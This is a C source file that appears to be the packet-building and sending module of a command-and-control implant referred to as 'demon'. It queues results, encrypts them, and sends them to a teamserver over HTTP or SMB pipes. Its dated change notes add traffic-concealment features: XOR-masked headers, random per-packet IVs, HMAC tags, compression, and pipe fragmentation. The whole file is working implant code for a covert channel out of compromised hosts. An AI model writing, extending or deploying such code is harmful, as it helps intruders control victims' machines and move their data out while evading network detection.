/* Import Core Headers */
#include <core/Package.h>
#include <core/MiniStd.h>
#include <core/Command.h>
#include <core/Transport.h>
#include <core/TransportSmb.h>

/* [HVC-005 2026-03-28] RSA_CIPHERTEXT_LEN constant for registration padding. */
#include <crypt/RsaCrypt.h>

/* Import Crypto Header (enable CTR Mode) */
#define CTR    1
#define AES256 1
#include <crypt/AesCrypt.h>
/* [HVC-006 2026-03-26] HMAC-SHA256 for packet authentication. */
#include <crypt/HmacSha256.h>

VOID Int64ToBuffer( PUCHAR Buffer, UINT64 Value )
{
    Buffer[ 7 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 6 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 5 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 4 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 3 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 2 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 1 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 0 ] = Value & 0xFF;
}

VOID Int32ToBuffer(
    OUT PUCHAR Buffer,
    IN  UINT32 Size
) {
    ( Buffer ) [ 0 ] = ( Size >> 24 ) & 0xFF;
    ( Buffer ) [ 1 ] = ( Size >> 16 ) & 0xFF;
    ( Buffer ) [ 2 ] = ( Size >> 8  ) & 0xFF;
    ( Buffer ) [ 3 ] = ( Size       ) & 0xFF;
}

VOID PackageAddInt32(
    _Inout_ PPACKAGE Package,
    IN     UINT32   Data
) {
    if ( ! Package ) {
        return;
    }

    Package->Buffer = Instance->Win32.LocalReAlloc(
            Package->Buffer,
            Package->Length + sizeof( UINT32 ),
            LMEM_MOVEABLE
    );

    Int32ToBuffer( Package->Buffer + Package->Length, Data );

    Package->Length += sizeof( UINT32 );
}

VOID PackageAddInt64( PPACKAGE Package, UINT64 dataInt )
{
    if ( ! Package ) {
        return;
    }

    Package->Buffer = Instance->Win32.LocalReAlloc(
            Package->Buffer,
            Package->Length + sizeof( UINT64 ),
            LMEM_MOVEABLE
    );

    Int64ToBuffer( Package->Buffer + Package->Length, dataInt );

    Package->Length += sizeof( UINT64 );
}

VOID PackageAddBool(
    _Inout_ PPACKAGE Package,
    IN     BOOLEAN  Data
) {
    if ( ! Package ) {
        return;
    }

    Package->Buffer = Instance->Win32.LocalReAlloc(
            Package->Buffer,
            Package->Length + sizeof( UINT32 ),
            LMEM_MOVEABLE
    );

    Int32ToBuffer( Package->Buffer + Package->Length, Data ? 1 : 0 );

    Package->Length += sizeof( UINT32 );
}

VOID PackageAddPtr( PPACKAGE Package, PVOID pointer )
{
    PackageAddInt64( Package, ( UINT64 ) pointer );
}

VOID PackageAddPad( PPACKAGE Package, PCHAR Data, SIZE_T Size )
{
    if ( ! Package )
        return;

    Package->Buffer = Instance->Win32.LocalReAlloc(
            Package->Buffer,
            Package->Length + Size,
            LMEM_MOVEABLE | LMEM_ZEROINIT
    );

    MemCopy( Package->Buffer + ( Package->Length ), Data, Size );

    Package->Length += Size;
}

VOID PackageAddBytes( PPACKAGE Package, PBYTE Data, SIZE_T Size )
{
    if ( ! Package ) {
        return;
    }

    PackageAddInt32( Package, Size );

    if ( Size )
    {
        Package->Buffer = Instance->Win32.LocalReAlloc(
            Package->Buffer,
            Package->Length + Size,
            LMEM_MOVEABLE | LMEM_ZEROINIT
        );

        MemCopy( Package->Buffer + Package->Length, Data, Size );

        Package->Length += Size;
    }
}

VOID PackageAddString( PPACKAGE package, PCHAR data )
{
    PackageAddBytes( package, (PBYTE) data, StringLengthA( data ) );
}

VOID PackageAddWString( PPACKAGE package, PWCHAR data )
{
    PackageAddBytes( package, (PBYTE) data, StringLengthW( data ) * 2 );
}

PPACKAGE PackageCreate( UINT32 CommandID )
{
    PPACKAGE Package = NULL;

    Package            = Instance->Win32.LocalAlloc( LPTR, sizeof( PACKAGE ) );
    Package->Buffer    = Instance->Win32.LocalAlloc( LPTR, sizeof( BYTE ) );
    Package->Length    = 0;
    Package->RequestID = Instance->CurrentRequestID;
    Package->CommandID = CommandID;
    Package->Encrypt   = TRUE;
    Package->Destroy   = TRUE;
    Package->Included  = FALSE;
    Package->Next      = NULL;

    return Package;
}

PPACKAGE PackageCreateWithMetaData( UINT32 CommandID )
{
    PPACKAGE Package = PackageCreate( CommandID );

    PackageAddInt32( Package, 0 ); // package length
    PackageAddInt32( Package, DEMON_MAGIC_VALUE );
    PackageAddInt32( Package, Instance->Session.AgentID );
    PackageAddInt32( Package, Package->CommandID );
    PackageAddInt32( Package, Package->RequestID );

    return Package;
}

PPACKAGE PackageCreateWithRequestID( UINT32 CommandID, UINT32 RequestID )
{
    PPACKAGE Package = PackageCreate( CommandID );

    Package->RequestID = RequestID;

    return Package;
}

/* Internal destroy — caller must hold PACKAGES_LOCK or guarantee
 * the package is not on Instance->Packages (e.g., the GET_JOB
 * wrapper created inside PackageTransmitAll). */
static VOID PackageDestroyInner(
    IN PPACKAGE Package
) {
    if ( Package )
    {
        if ( Package->Buffer )
        {
            MemSet( Package->Buffer, 0, Package->Length );
            Instance->Win32.LocalFree( Package->Buffer );
            Package->Buffer = NULL;
        }

        MemSet( Package, 0, sizeof( PACKAGE ) );
        Instance->Win32.LocalFree( Package );
    }
}

VOID PackageDestroy(
    IN PPACKAGE Package
) {
    if ( Package )
    {
        // make sure the package is not on the Instance->Packages list, avoid UAF.
        PACKAGES_LOCK();
        {
            PPACKAGE Pkg = Instance->Packages;
            while ( Pkg )
            {
                if ( Package == Pkg )
                {
                    PUTS_DONT_SEND( "Package can't be destroyed, is on Instance->Packages list" )
                    PACKAGES_UNLOCK();
                    return;
                }
                Pkg = Pkg->Next;
            }
        }
        PACKAGES_UNLOCK();

        PackageDestroyInner( Package );
    }
}

// used to send the demon's metadata
BOOL PackageTransmitNow(
    _Inout_ PPACKAGE Package,
    OUT    PVOID*   Response,
    OUT    PSIZE_T  Size
) {
    AESCTX AesCtx  = { 0 };
    BOOL   Success = FALSE;
    UINT32 Padding = 0;

    PRINTF( "PackageTransmitNow: ENTRY Package=%p CommandID=%d Length=%lu Encrypt=%d\n",
            Package,
            Package ? Package->CommandID : 0,
            Package ? (unsigned long) Package->Length : 0,
            Package ? Package->Encrypt : 0 )

    if ( Package )
    {
        if ( ! Package->Buffer ) {
            PUTS_DONT_SEND( "Package->Buffer is empty" )
            return FALSE;
        }

        // writes package length to buffer
        Int32ToBuffer( Package->Buffer, Package->Length - sizeof( UINT32 ) );

        if ( Package->Encrypt )
        {
            Padding = sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 );

            /* [HVC-005 2026-03-28] For DEMON_INITIALIZE the session key material is
             * now wrapped in a 256-byte RSA-OAEP ciphertext (replacing the old
             * 48-byte plaintext AES key + IV).  Skip the full RSA ciphertext block
             * so AES encryption starts on the metadata that follows it. */
            if ( Package->CommandID == DEMON_INITIALIZE ) {
                Padding += RSA_CIPHERTEXT_LEN;
            }

            AesInit( &AesCtx, Instance->Config.AES.Key, Instance->Config.AES.IV );
            AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
        }

        /* [HVC-003 2026-03-26] Obfuscate outer header bytes 4-19 (magic, agent ID,
         * command ID, request ID) with SIZE ^ HEADER_MASK_SEED before wire transmission.
         * The SIZE field at bytes 0-3 is never masked so the receiver can recompute the
         * same mask and reverse it. XOR is self-reversing: applying this block twice
         * restores the original bytes. See TrafficImprovements.md §3. */
        {
            PUCHAR _h  = (PUCHAR) Package->Buffer;
            UINT32 _m  = ( ((UINT32)_h[0] << 24) | ((UINT32)_h[1] << 16)
                         | ((UINT32)_h[2] <<  8) |  (UINT32)_h[3] )
                       ^ HEADER_MASK_SEED;
            UINT32 _i;
            UCHAR  _mb[4] = { (UCHAR)(_m >> 24), (UCHAR)(_m >> 16),
                              (UCHAR)(_m >>  8), (UCHAR) _m };
            for ( _i = 0; _i < 16; _i++ ) { _h[ 4 + _i ] ^= _mb[ _i % 4 ]; }
        }

        if ( TransportSend( Package->Buffer, Package->Length, Response, Size ) ) {
            Success = TRUE;
        } else {
            PUTS_DONT_SEND("TransportSend failed!")
        }

        /* [HVC-003 2026-03-26] Reverse the header mask — XOR with same mask
         * restores original bytes so the package buffer is clean after send. */
        {
            PUCHAR _h  = (PUCHAR) Package->Buffer;
            UINT32 _m  = ( ((UINT32)_h[0] << 24) | ((UINT32)_h[1] << 16)
                         | ((UINT32)_h[2] <<  8) |  (UINT32)_h[3] )
                       ^ HEADER_MASK_SEED;
            UINT32 _i;
            UCHAR  _mb[4] = { (UCHAR)(_m >> 24), (UCHAR)(_m >> 16),
                              (UCHAR)(_m >>  8), (UCHAR) _m };
            for ( _i = 0; _i < 16; _i++ ) { _h[ 4 + _i ] ^= _mb[ _i % 4 ]; }
        }

        if ( Package->Destroy ) {
            PackageDestroy( Package ); Package = NULL;
        } else if ( Package->Encrypt ) {
            /* [BUGFIX-004 2026-03-29] Re-initialise AesCtx to the original IV so the
             * second XCryptBuffer call generates the SAME keystream as the first one
             * and correctly restores the plaintext.  Without this, AES-CTR's counter
             * has already advanced after the encrypt call, producing a different
             * keystream that corrupts Package->Buffer for subsequent reconnects. */
            AesInit( &AesCtx, Instance->Config.AES.Key, Instance->Config.AES.IV );
            AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
        }
    } else {
        PUTS_DONT_SEND( "Package is empty" )
        Success = FALSE;
    }

    PRINTF( "PackageTransmitNow: EXIT Success=%d\n", Success )
    return Success;
}

// don't transmit right away, simply store the package. Will be sent when PackageTransmitAll is called
VOID PackageTransmit(
    IN PPACKAGE Package
) {
    PPACKAGE List      = NULL;
    UINT32   RequestID = 0;
    UINT32   Length    = 0;

    if ( ! Package ) {
        return;
    }

#if TRANSPORT_SMB
        /* [ISSUE-5] If a single package exceeds PIPE_BUFFER_MAX, split it into
         * fragment packages that each fit within the pipe limit.  Each fragment
         * carries a header: [FragID][SeqNum][TotalFrags][OrigCmdID][OrigReqID]
         * followed by a chunk of the original buffer.  The teamserver reassembles
         * fragments by FragID before dispatching the reconstructed command. */
        if ( sizeof( UINT32 ) * 8 + Package->Length > PIPE_BUFFER_MAX )
        {
            UINT32   FragID      = RandomNumber32();
            UINT32   TotalFrags  = ( Package->Length + SMB_FRAG_MAX_DATA - 1 ) / SMB_FRAG_MAX_DATA;
            UINT32   OrigCmdID   = Package->CommandID;
            UINT32   OrigReqID   = Package->RequestID;
            SIZE_T   Remaining   = Package->Length;
            SIZE_T   Offset      = 0;
            UINT32   Seq         = 0;

            PRINTF( "PackageTransmit: fragmenting package 0x%x bytes into %d fragments (FragID=%08x)\n",
                    Package->Length, TotalFrags, FragID )

            while ( Remaining > 0 )
            {
                SIZE_T   ChunkSize = ( Remaining > SMB_FRAG_MAX_DATA ) ? SMB_FRAG_MAX_DATA : Remaining;
                PPACKAGE FragPkg   = PackageCreate( DEMON_PACKAGE_FRAGMENT );

                FragPkg->RequestID = OrigReqID;

                PackageAddInt32( FragPkg, FragID );
                PackageAddInt32( FragPkg, Seq );
                PackageAddInt32( FragPkg, TotalFrags );
                PackageAddInt32( FragPkg, OrigCmdID );
                PackageAddInt32( FragPkg, OrigReqID );
                PackageAddBytes( FragPkg, (PBYTE) Package->Buffer + Offset, ChunkSize );

                /* Append fragment to the packages list (lock already acquired
                 * by the PACKAGES_LOCK below, or will be — we queue first,
                 * then fall through to the list-append code). */
                PACKAGES_LOCK();
                if ( ! Instance->Packages ) {
                    Instance->Packages = FragPkg;
                } else {
                    PPACKAGE Tail = Instance->Packages;
                    while ( Tail->Next ) { Tail = Tail->Next; }
                    Tail->Next = FragPkg;
                }
                PACKAGES_UNLOCK();

                Offset    += ChunkSize;
                Remaining -= ChunkSize;
                Seq++;
            }

            /* Destroy the original oversized package */
            if ( Package->Destroy ) {
                PackageDestroyInner( Package );
            }

            return;
        }
#endif

    PACKAGES_LOCK();

    if ( ! Instance->Packages )
    {
        Instance->Packages = Package;
    }
    else
    {
        // add the new package to the end of the list (to preserve the order)
        List = Instance->Packages;
        while ( List->Next ) {
            List = List->Next;
        }
        List->Next = Package;
    }

    PACKAGES_UNLOCK();
}

// transmit all stored packages in a single request
BOOL PackageTransmitAll(
    OUT    PVOID*   Response,
    OUT    PSIZE_T  Size
) {
    AESCTX   AesCtx          = { 0 };
    BOOL     Success         = FALSE;
    UINT32   Padding         = 0;
    PPACKAGE Package         = NULL;
    PPACKAGE Pkg             = Instance->Packages;
    /* [HVC-007 2026-03-28] LZNT1 compression state */
    PUCHAR   CompressedBuf   = NULL;
    ULONG    CompressedLen   = 0;
    BOOL     PayloadCompressed = FALSE;
    PPACKAGE Entry   = NULL;
    PPACKAGE Prev    = NULL;

    PUTS( "PackageTransmitAll: ENTRY" )

    /* Lock the packages list while reading and marking entries.
     * The lock is released before the blocking TransportSend call
     * and re-acquired for the cleanup phase. */
    PACKAGES_LOCK();

#if TRANSPORT_SMB
    // SMB pivots don't need to send DEMON_COMMAND_GET_JOB
    // so if we don't having nothing to send, simply exit
    if ( ! Instance->Packages ) {
        PACKAGES_UNLOCK();
        return TRUE;
    }
#endif

    Package = PackageCreateWithMetaData( DEMON_COMMAND_GET_JOB );

    // add all the packages we want to send to the main package
    while ( Pkg )
    {
#if TRANSPORT_SMB
        /* SMB: the final wire buffer is Package->Length + AES_BLOCKLEN (IV) +
         * HMAC_SHA256_SIZE (tag).  Keep the total below PIPE_BUFFER_MAX so
         * PackageTransmitAll never splits into more than one WriteFile message.
         * A split creates an orphaned tail message that PivotPush cannot drain. */
        if ( Package->Length + sizeof( UINT32 ) * 3 + Pkg->Length + AES_BLOCKLEN + HMAC_SHA256_SIZE > PIPE_BUFFER_MAX )
            break;
#endif

        PackageAddInt32( Package, Pkg->CommandID );
        PackageAddInt32( Package, Pkg->RequestID );
        PackageAddBytes( Package, Pkg->Buffer, Pkg->Length );
        Pkg->Included = TRUE;

        // make sure we don't send a package larger than DEMON_MAX_REQUEST_LENGTH
        if ( Package->Length > DEMON_MAX_REQUEST_LENGTH )
            break;

        Prev = Pkg;
        Pkg  = Pkg->Next;
    }

    /* Release lock before the blocking network send. Background threads
     * can safely append new packages while we're transmitting. */
    PACKAGES_UNLOCK();

    // writes package length to buffer
    Int32ToBuffer( Package->Buffer, Package->Length - sizeof( UINT32 ) );

    /*
     *  Header:
     *  [ SIZE         ] 4 bytes
     *  [ Magic Value  ] 4 bytes
     *  [ Agent ID     ] 4 bytes
     *  [ COMMAND ID   ] 4 bytes
     *  [ Request ID   ] 4 bytes
    */
    Padding = sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 );

    /* [HVC-007 2026-03-28] LZNT1-compress the payload region before AES encryption.
     * Only compress if payload > COMPRESS_MIN_SIZE bytes (compression overhead
     * exceeds benefit on tiny packets).  The compressed buffer is used in the
     * HVC-004 block instead of Package->Buffer+Padding.  Bit 31 of the wire SIZE
     * field signals compression to the teamserver. See TrafficImprovements.md §7. */
#define COMPRESS_MIN_SIZE 256
#ifndef COMPRESSION_FORMAT_LZNT1
#define COMPRESSION_FORMAT_LZNT1    0x0002
#define COMPRESSION_ENGINE_STANDARD 0x0000
#endif
    if (   Instance->Win32.RtlGetCompressionWorkSpaceSize != NULL
        && Instance->Win32.RtlCompressBuffer              != NULL
        && Package->Length - Padding > COMPRESS_MIN_SIZE )
    {
        ULONG WsSize = 0;
        ULONG WsFrag = 0;
        PVOID Ws     = NULL;

        if ( NT_SUCCESS( Instance->Win32.RtlGetCompressionWorkSpaceSize(
                COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_STANDARD,
                &WsSize, &WsFrag ) ) )
        {
            Ws = Instance->Win32.LocalAlloc( LPTR, WsSize );
            if ( Ws )
            {
                /* Extra 64 bytes headroom — RtlCompressBuffer may expand on incompressible data */
                CompressedBuf = Instance->Win32.LocalAlloc( LPTR, Package->Length - Padding + 64 );
                if ( CompressedBuf )
                {
                    NTSTATUS CmpStatus = Instance->Win32.RtlCompressBuffer(
                        COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_STANDARD,
                        Package->Buffer + Padding, Package->Length - Padding,
                        CompressedBuf, Package->Length - Padding + 64,
                        4096, &CompressedLen, Ws );

                    if ( NT_SUCCESS( CmpStatus ) && CompressedLen < Package->Length - Padding )
                    {
                        PayloadCompressed = TRUE;
                        PRINTF( "PackageTransmitAll: LZNT1 compressed %lu -> %lu bytes\n",
                                (unsigned long) ( Package->Length - Padding ),
                                (unsigned long) CompressedLen )
                    }
                    else
                    {
                        /* Compression failed or expanded data — fall back to plaintext */
                        PUTS( "PackageTransmitAll: LZNT1 compression skipped (expanded or failed)" )
                        Instance->Win32.LocalFree( CompressedBuf );
                        CompressedBuf = NULL;
                        CompressedLen = 0;
                    }
                }
                Instance->Win32.LocalFree( Ws );
            }
        }
    }

    /* [HVC-004 2026-03-26] Generate a fresh random IV for each beacon packet and
     * prepend it in plaintext between the header and encrypted payload so the
     * teamserver can extract and use it for decryption. A separate WireBuffer is
     * allocated to avoid modifying Package->Buffer in-place.
     * WireBuffer layout: [SIZE(4)][header fields(16)][IV(16)][encrypted payload]
     * See TrafficImprovements.md §4. */
    {
        UCHAR   RandIV[ AES_BLOCKLEN ];
        PUCHAR  WireBuffer;
        UINT32  WireLength;
        UINT32  _r;
        UINT32  _i;

        /* Fill 16-byte random IV from 4× RandomNumber32() calls (big-endian store) */
        for ( _i = 0; _i < AES_BLOCKLEN / sizeof( UINT32 ); _i++ ) {
            _r = RandomNumber32();
            RandIV[ _i * 4 + 0 ] = (UCHAR)( _r >> 24 );
            RandIV[ _i * 4 + 1 ] = (UCHAR)( _r >> 16 );
            RandIV[ _i * 4 + 2 ] = (UCHAR)( _r >>  8 );
            RandIV[ _i * 4 + 3 ] = (UCHAR)  _r;
        }

        /* [HVC-007 2026-03-28] Use the compressed buffer if compression succeeded,
         * otherwise fall back to the original plaintext payload. */
        PUCHAR EncPayload = PayloadCompressed ? CompressedBuf              : Package->Buffer + Padding;
        UINT32 EncLen     = PayloadCompressed ? CompressedLen              : Package->Length - Padding;

        PRINTF( "PackageTransmitAll: encrypt PayloadLen=%lu Padding=%lu Compressed=%d\n",
                (unsigned long) EncLen, (unsigned long) Padding, PayloadCompressed )
        PRINT_HEX( RandIV, 16 )

        /* Encrypt payload region using the fresh random IV */
        AesInit( &AesCtx, Instance->Config.AES.Key, RandIV );
        AesXCryptBuffer( &AesCtx, EncPayload, EncLen );

        /* Build WireBuffer: header (Padding bytes) + IV (16 bytes) + encrypted payload */
        WireLength = Padding + AES_BLOCKLEN + EncLen;
        WireBuffer = (PUCHAR) Instance->Win32.LocalAlloc( LPTR, WireLength );
        MemCopy( WireBuffer,                           Package->Buffer, Padding    );
        MemCopy( WireBuffer + Padding,                 RandIV,          AES_BLOCKLEN );
        MemCopy( WireBuffer + Padding + AES_BLOCKLEN,  EncPayload,      EncLen     );

        /* Update SIZE field in WireBuffer: (bytes after SIZE) | compression bit.
         * [HVC-007] Bit 31 signals LZNT1 compression to the teamserver.
         * The HVC-003 XOR mask below reads this value, so both sides compute
         * the same mask. The teamserver strips bit 31 in ParseHeader. */
        {
            UINT32 WireSize = WireLength - sizeof( UINT32 );
            if ( PayloadCompressed ) WireSize |= 0x80000000UL;
            Int32ToBuffer( WireBuffer, WireSize );
        }

        /* [HVC-003 2026-03-26] Obfuscate outer header bytes 4-19 in WireBuffer
         * using the updated WireBuffer SIZE as the mask base. See TrafficImprovements.md §3. */
        {
            PUCHAR _h  = WireBuffer;
            UINT32 _m  = ( ((UINT32)_h[0] << 24) | ((UINT32)_h[1] << 16)
                         | ((UINT32)_h[2] <<  8) |  (UINT32)_h[3] )
                       ^ HEADER_MASK_SEED;
            UCHAR  _mb[4] = { (UCHAR)(_m >> 24), (UCHAR)(_m >> 16),
                              (UCHAR)(_m >>  8), (UCHAR) _m };
            for ( _i = 0; _i < 16; _i++ ) { _h[ 4 + _i ] ^= _mb[ _i % 4 ]; }
        }

        /* [HVC-006 2026-03-26] Compute HMAC-SHA256 over the masked WireBuffer and
         * append the 32-byte tag (encrypt-then-MAC). The teamserver verifies the
         * tag before parsing. See TrafficImprovements.md §6. */
        {
            UCHAR  MacKey[ HMAC_SHA256_SIZE ];
            UCHAR  Tag[ HMAC_SHA256_SIZE ];
            PUCHAR AuthWireBuffer;
            UINT32 AuthWireLength;

            /* Derive MAC key: HMAC-SHA256(AES_key, "mac") */
            HmacSha256( Instance->Config.AES.Key, 32,
                        (PUCHAR)"mac", 3,
                        MacKey );

            /* Authenticate: SIZE + masked header + IV + ciphertext */
            HmacSha256( MacKey, HMAC_SHA256_SIZE,
                        (PUCHAR) WireBuffer, WireLength,
                        Tag );

            MemSet( MacKey, 0, sizeof( MacKey ) );

            /* Build AuthWireBuffer = WireBuffer || Tag */
            AuthWireLength = WireLength + HMAC_SHA256_SIZE;
            AuthWireBuffer = (PUCHAR) Instance->Win32.LocalAlloc( LPTR, AuthWireLength );
            MemCopy( AuthWireBuffer,              WireBuffer, WireLength       );
            MemCopy( AuthWireBuffer + WireLength, Tag,        HMAC_SHA256_SIZE );

            MemSet( Tag, 0, sizeof( Tag ) );

            PRINTF( "PackageTransmitAll: TransportSend AuthWireLength=%lu (Wire=%lu + HMAC=32)\n",
                    (unsigned long) AuthWireLength, (unsigned long) WireLength )
            if ( TransportSend( AuthWireBuffer, AuthWireLength, Response, Size ) ) {
                Success = TRUE;
                PRINTF( "PackageTransmitAll: TransportSend OK Response=%p ResponseSize=%llu\n",
                        Response ? *Response : NULL,
                        (unsigned long long) ( Size ? *Size : 0 ) )
            } else {
                PUTS_DONT_SEND("TransportSend failed!")
            }

            MemSet( AuthWireBuffer, 0, AuthWireLength );
            Instance->Win32.LocalFree( AuthWireBuffer );
        }

        /* Wipe and free WireBuffer */
        MemSet( WireBuffer, 0, WireLength );
        Instance->Win32.LocalFree( WireBuffer );

        if ( ! PayloadCompressed ) {
            /* Re-decrypt Package->Buffer so queue-management code below sees clean data */
            AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
        } else {
            /* [HVC-007] Compressed path: Package->Buffer was never modified.
             * Wipe and free the encrypted CompressedBuf. */
            MemSet( CompressedBuf, 0, CompressedLen );
            Instance->Win32.LocalFree( CompressedBuf );
            CompressedBuf = NULL;
        }
    }

    /* Re-acquire the lock for cleanup — background threads may have
     * appended new packages during the send. */
    PACKAGES_LOCK();

    Entry = Instance->Packages;
    Prev  = NULL;

    if ( Success )
    {
        // the request worked, remove all the packages that were included

        while ( Entry )
        {
            if ( Entry->Included )
            {
                // is this the first entry?
                if ( Entry == Instance->Packages )
                {
                    // update the start of the list
                    Instance->Packages = Entry->Next;

                    // remove the entry if required (use inner — lock is held)
                    if ( Entry->Destroy ) {
                        PackageDestroyInner( Entry ); Entry = NULL;
                    }

                    Entry = Instance->Packages;
                    Prev  = NULL;
                }
                else
                {
                    if ( Prev )
                    {
                        // remove the entry from the list
                        Prev->Next = Entry->Next;

                        // remove the entry if required (use inner — lock is held)
                        if ( Entry->Destroy ) {
                            PackageDestroyInner( Entry ); Entry = NULL;
                        }

                        Entry = Prev->Next;
                    }
                    else
                    {
                        // wut? this shouldn't happen
                        PUTS_DONT_SEND( "Failed to cleanup packages list" )
                    }
                }
            }
            else
            {
                Prev  = Entry;
                Entry = Entry->Next;
            }
        }
    }
    else
    {
        // the request failed, mark all packages as not included for next time
        while ( Entry )
        {
            Entry->Included = FALSE;
            Entry           = Entry->Next;
        }
    }

    PACKAGES_UNLOCK();

    PackageDestroy( Package ); Package = NULL;

    PRINTF( "PackageTransmitAll: EXIT Success=%d\n", Success )
    return Success;
}

VOID PackageTransmitError(
    IN UINT32 ID,
    IN UINT32 ErrorCode
) {
    PPACKAGE Package = NULL;

    PRINTF_DONT_SEND( "Transmit Error: %d\n", ErrorCode );

    Package = PackageCreate( DEMON_ERROR );

    PackageAddInt32( Package, ID );
    PackageAddInt32( Package, ErrorCode );
    PackageTransmit( Package );
}

